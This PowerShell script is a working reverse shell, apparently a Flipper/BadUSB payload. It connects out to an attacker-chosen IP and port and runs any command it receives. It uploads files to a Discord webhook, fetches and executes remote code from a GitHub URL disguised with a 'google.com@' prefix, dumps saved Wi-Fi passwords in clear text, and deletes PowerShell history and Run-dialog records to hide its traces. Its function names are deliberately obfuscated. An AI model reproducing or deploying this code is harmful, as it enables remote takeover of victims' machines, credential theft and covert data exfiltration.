param (
    [string]$webhook,
    [string]$ip,
    [int]$port
)

# Create TCP client connection and streams
$client = New-Object Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object IO.StreamWriter($stream)

function SendToStream($msg) {
    $writer.Write($msg + 'ffff> ')
    $writer.Flush()
}

function hasbullawjwindbw {
    (iwr 'https://google.com@raw.githubusercontent.com/CharlesTheGreat77/token2Discord/main/Testing.txt').Content | iex
}

function popopwhwhbsvxjnfiifb {
    $PsandQs = netsh wlan export profile key=clear; Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace '.xml:22:', ''}
    SendToStream "OUTPUT: $PsandQs"
}

function flipejsjiebsbllb($ibwjskwbnskieg) {
    $body = @{ content = $ibwjskwbnskieg } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $body
}

function kwhhabzbabjeikfn {
    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
    Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -ErrorAction SilentlyContinue
}

SendToStream "Connected to $ip on port $port"

$buffer = New-Object byte[] $client.ReceiveBufferSize
$read = 1

while ($read -ge 0) {
    $read = $stream.Read($buffer, 0, $buffer.Length)

    if ($read -gt 0) {
        $inputStr = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $read - 1)

        if ($inputStr -match "^/discord\s+(.+)$") {
            $filename = $matches[1]
            $msg = "Flipper Report for $env:USERNAME"
            flipejsjiebsbllb $msg
            curl.exe -F "file1=@$filename" $webhook
            SendToStream "File '$filename' sent.."
        }
        elseif ($inputStr -match "^/tgrizzly$") {
            SendToStream "Executing /tgrizzly functionality.. saving output to C:\temp\output.txt"
            hasbullawjwindbw
        }
        elseif ($inputStr -match "^/wifi$") {
            SendToStream "Executing /wifi.."
            popopwhwhbsvxjnfiifb
        }
        elseif ($inputStr -match "^/clean$") {
            SendToStream "Executing cleanup.."
            kwhhabzbabjeikfn
        }
        else {
            $result = try { Invoke-Expression $inputStr 2>&1 | Out-String } catch { $_ | Out-String }
            SendToStream $result
        }
    }
}

$writer.Close()
$client.Close()
